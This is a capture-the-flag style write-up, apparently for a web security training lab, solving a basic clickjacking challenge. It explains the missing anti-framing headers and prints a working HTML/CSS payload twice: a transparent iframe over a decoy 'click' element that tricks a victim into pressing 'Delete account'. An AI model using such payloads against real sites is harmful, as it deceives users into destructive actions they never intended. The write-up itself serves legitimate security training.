## Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter

Note :

The victim will be using Chrome so test your exploit on that browser.

## Notes

- /login
- Possibility to leave a comment
- Exploit Server
- No `X-Frame-Options`
- No `CSP frame-ancestors`

## Resume

1. Load the target page inside an iframe
2. Make the iframe transparent
3. Overlay a fake button
4. Align the fake content with the real `Delete account` button
5. Deliver the exploit to the victim
6. Trigger account deletion

## Solve

The application allows its pages to be embedded inside an iframe because no anti-framing protections are enabled.

The following protections are missing:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy: frame-ancestors
```

This means an attacker can load the sensitive account page inside an invisible iframe:

```html
<iframe src="https://0a8200d5035d5cbb833d05e8000c000c.web-security-academy.net/my-account"></iframe>
```

The attack works by placing a fake visible element above the real iframe button.

The iframe is made nearly invisible using:

```css
opacity: 0.0001;
```

The iframe is also positioned above the fake content using:

```css
z-index: 2;
```

while the decoy element remains underneath:

```css
z-index: 1;
```

The attacker aligns the fake text:

```html
<div>click</div>
```

with the real:

```text
Delete account
```

button inside the iframe.

When the victim attempts to click the fake content, the click is actually sent to the hidden iframe element.

Exploit payload:

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:505;
        left:60;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe src="https://0a8200d5035d5cbb833d05e8000c000c.web-security-academy.net/my-account"></iframe>
```

Breakdown:

- `position:relative` → positions the iframe correctly
- `opacity:0.0001` → makes the iframe invisible
- `z-index:2` → places the iframe above the visible text
- `top:505` and `left:60` → align the bait text with the dangerous button

The victim sees:

```text
click
```

but actually interacts with:

```text
Delete account
```

inside the transparent iframe.

As a result, the account deletion action is triggered without the victim realizing it.

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:505;
        left:60;
        z-index: 1;
    }
</style>

<div>click</div>

<iframe src="https://0a8200d5035d5cbb833d05e8000c000c.web-security-academy.net/my-account"></iframe>
```